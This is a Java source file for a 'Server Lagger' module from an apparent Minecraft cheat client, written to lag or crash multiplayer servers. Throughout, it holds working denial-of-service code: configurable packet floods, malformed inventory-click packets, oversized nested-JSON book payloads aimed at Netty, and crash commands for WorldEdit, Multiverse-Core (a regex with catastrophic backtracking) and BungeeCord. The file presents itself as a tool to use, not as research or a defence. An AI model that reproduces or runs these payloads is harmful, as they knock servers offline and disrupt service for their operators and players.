package wtf.bhopper.nonsense.module.impl.exploit;

import io.netty.util.internal.ThreadLocalRandom;
import net.minecraft.init.Blocks;
import net.minecraft.init.Items;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagByte;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.*;
import net.minecraft.util.BlockPos;
import net.minecraft.util.EnumFacing;
import wtf.bhopper.nonsense.event.EventLink;
import wtf.bhopper.nonsense.event.Listener;
import wtf.bhopper.nonsense.event.impl.client.EventTick;
import wtf.bhopper.nonsense.module.Module;
import wtf.bhopper.nonsense.module.ModuleCategory;
import wtf.bhopper.nonsense.module.ModuleInfo;
import wtf.bhopper.nonsense.module.property.impl.BooleanProperty;
import wtf.bhopper.nonsense.module.property.impl.EnumProperty;
import wtf.bhopper.nonsense.module.property.impl.GroupProperty;
import wtf.bhopper.nonsense.module.property.impl.NumberProperty;
import wtf.bhopper.nonsense.util.minecraft.inventory.ItemBuilder;
import wtf.bhopper.nonsense.util.minecraft.world.BlockUtil;
import wtf.bhopper.nonsense.util.minecraft.player.PacketUtil;
import wtf.bhopper.nonsense.util.minecraft.player.PlayerUtil;
import wtf.bhopper.nonsense.util.misc.GeneralUtil;
import wtf.bhopper.nonsense.util.misc.Stopwatch;

import java.util.function.Supplier;

@ModuleInfo(name = "Server Lagger",
        description = "Lags/crashes a server",
        category = ModuleCategory.EXPLOIT)
public class ServerLagger extends Module {

    private static final String LETTERS = "abcdefghijklmnopqrstuvwxyz1234567890";

    private final EnumProperty<Mode> mode = new EnumProperty<>("Mode", "Method to cause lag.", Mode.INTERACT);
    private final NumberProperty delay = new NumberProperty("Delay", "Delay between sending packets.", () -> this.mode.get().multiPackets, 100.0, 1.0, 5000.0, 1.0, NumberProperty.FORMAT_MS);
    private final NumberProperty amount = new NumberProperty("Amount", "Amount of packets to send.", () -> this.mode.get().multiPackets, 500.0, 1.0, 10000.0, 1.0, NumberProperty.FORMAT_INT);
    private final BooleanProperty random = new BooleanProperty("Random", "Randomizes packets sent", true, () -> this.mode.isAny(Mode.INTERACT, Mode.BREAK, Mode.POSITION));

    private final GroupProperty nettyGroup = new GroupProperty("Netty", "Options for the netty crasher", this,() -> this.mode.is(Mode.NETTY));
    private final NumberProperty nettySize = new NumberProperty("Size", "Content size", 100, 1, 1000, 1);
    private final EnumProperty<NettyContentType> nettyContentType = new EnumProperty<>("Content Type", "Content type to send in the netty lagger", NettyContentType.JSON);
    private final EnumProperty<NettyPacketType> nettyPacketType = new EnumProperty<>("Packet Type", "Packet type for netty", NettyPacketType.BLOCK_PLACE);
    private final EnumProperty<NettyItemType> nettyItemType = new EnumProperty<>("Item Type", "Type of item to use", NettyItemType.WRITABLE_BOOK);

    private final Stopwatch delayClock = new Stopwatch();

    public ServerLagger() {
        super();
        this.nettyGroup.addProperties(this.nettySize, this.nettyContentType, this.nettyPacketType, this.nettyItemType);
        this.addProperties(this.mode, this.delay, this.amount, this.random, this.nettyGroup);
        this.setSuffix(this.mode::getDisplayValue);
    }

    @EventLink
    public final Listener<EventTick> onTick = _ -> {
        if (!PlayerUtil.canUpdate() || mc.thePlayer.ticksExisted < 20 || mc.isSingleplayer()) {
            this.toggle(false);
            return;
        }

        switch (this.mode.get()) {
            case INTERACT -> this.packetsCrash(() -> {
                if (this.random.get()) {
                    return new C08PacketPlayerBlockPlacement(BlockUtil.randomPos(), ThreadLocalRandom.current().nextInt(0, 6), null, 0.0F, 0.0F, 0.0F);
                }
                return new C08PacketPlayerBlockPlacement(BlockPos.ORIGIN, 0, null, 0.0F, 0.0F, 0.0F);
            });

            case BREAK -> this.packetsCrash(() -> {
                if (this.random.get()) {
                    return new C07PacketPlayerDigging(C07PacketPlayerDigging.Action.ABORT_DESTROY_BLOCK, BlockUtil.randomPos(), GeneralUtil.randomElement(EnumFacing.VALUES));
                }
                return new C07PacketPlayerDigging(C07PacketPlayerDigging.Action.ABORT_DESTROY_BLOCK, BlockPos.ORIGIN, EnumFacing.UP);
            });

            case POSITION -> this.packetsCrash(() -> {
                if (this.random.get()) {
                    return new C03PacketPlayer.C04PacketPlayerPosition(
                            ThreadLocalRandom.current().nextDouble(-3.0E+7, 3.0E+7),
                            ThreadLocalRandom.current().nextDouble(0.0, 256.0),
                            ThreadLocalRandom.current().nextDouble(-3.0E+7, 3.0E+7),
                            ThreadLocalRandom.current().nextBoolean()
                    );
                }
                return new C03PacketPlayer.C04PacketPlayerPosition(0.0, 0.0, 0.0, false);
            });

            case SWITCH -> {
                if (this.delayClock.hasReached(this.delay.getInt())) {
                    int prevSlot = mc.thePlayer.inventory.currentItem;
                    int slot = 0;
                    for (int i = 0; i < this.amount.getInt(); i++) {
                        do {
                            slot = ThreadLocalRandom.current().nextInt(0, 9);
                        } while (slot == prevSlot);
                        PacketUtil.send(new C09PacketHeldItemChange(slot));
                        prevSlot = slot;
                    }
                    if (slot != mc.thePlayer.inventory.currentItem) {
                        PacketUtil.send(new C09PacketHeldItemChange(mc.thePlayer.inventory.currentItem));
                    }
                    this.delayClock.reset();
                }
            }

            case PISTON_CLICK -> PacketUtil.send(new C0EPacketClickWindow(0, 0, 0, 1, new ItemStack(Blocks.piston_head), (short)0));

            case INVALID_CLICK -> PacketUtil.send(new C0EPacketClickWindow(0, 0, -1, 2, new ItemStack(Blocks.air), (short)0));

            case NETTY -> this.packetsCrash(this::nettyCrash);

            case WORLD_EDIT -> this.messageCrash(() -> "//EVAL for(i=0;i<256;i++){for(b=0;b<256;b++){for(h=0;h<256;h++){for(n=0;n<256;n++){}}}}", false);

            case MULTIVERSE_CORE -> this.messageCrash(() -> "/Multiverse-Core:mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^", false);

            case MULTIVERSE_CORE_2 -> this.messageCrash(() -> "/mVhElP <*.*.*.*.*.*.*.>", false);

            case BUNGEE_REPORT -> this.messageCrash(() -> "/report ", true);

        }

    };

    private void packetsCrash(Supplier<Packet<?>> packetSupplier) {
        if (this.delayClock.hasReached(this.delay.getInt())) {
            for (int i = 0; i < this.amount.getInt(); i++) {
                PacketUtil.send(packetSupplier.get());
            }
            this.delayClock.reset();
        }
    }

    private void messageCrash(Supplier<String> message, boolean tab) {
        if (tab) {
            this.packetsCrash(() -> new C14PacketTabComplete(message.get()));
        } else {
            this.packetsCrash(() -> new C01PacketChatMessage(message.get()));
        }
    }

    private Packet<?> nettyCrash() {

        NBTTagList pages = new NBTTagList();
        StringBuilder content = new StringBuilder();

        switch (this.nettyContentType.get()) {
            case JSON -> content.append("{")
                    .append("extra:[{".repeat(this.nettySize.getInt()))
                    .append("text:L}],".repeat(this.nettySize.getInt()))
                    .append("text:L}");
            case POINT -> content.append(".".repeat(this.nettySize.getInt()));
            case RANDOM -> {
                for (int i = 0; i < this.nettySize.getInt(); i++) {
                    content.append(GeneralUtil.randomElement(LETTERS));
                }
            }
        }

        pages.appendTag(new NBTTagString(content.toString()));

        Item item = switch (this.nettyItemType.get()) {
            case WRITABLE_BOOK -> Items.writable_book;
            case WRITTEN_BOOK -> Items.written_book;
        };

        ItemStack stack = ItemBuilder.of(item)
                .addTag("author", new NBTTagString(mc.thePlayer.getName()))
                .addTag("title", new NBTTagString("book of tomfoolery"))
                .addTag("resolved", new NBTTagByte((byte)1))
                .addTag("pages", pages)
                .build();

        return switch (this.nettyPacketType.get()) {
            case BLOCK_PLACE -> new C08PacketPlayerBlockPlacement(mc.thePlayer.getPosition(), 0, stack, 0.0F, 0.0F, 0.0F);
            case WINDOW_CLICK -> new C0EPacketClickWindow(0, 2, 0, 0, stack, (short)1);
        };
    }

    private enum Mode {
        INTERACT(true),
        BREAK(true),
        POSITION(true),
        SWITCH(true),
        PISTON_CLICK(false),
        INVALID_CLICK(false),
        NETTY(true),
        WORLD_EDIT(true),
        MULTIVERSE_CORE(true),
        MULTIVERSE_CORE_2(true),
        BUNGEE_REPORT(true);

        public final boolean multiPackets;

        Mode(boolean multiPackets) {
            this.multiPackets = multiPackets;
        }
    }

    private enum NettyContentType {
        JSON,
        POINT,
        RANDOM
    }

    private enum NettyPacketType {
        BLOCK_PLACE,
        WINDOW_CLICK
    }

    private enum NettyItemType {
        WRITABLE_BOOK,
        WRITTEN_BOOK
    }


}
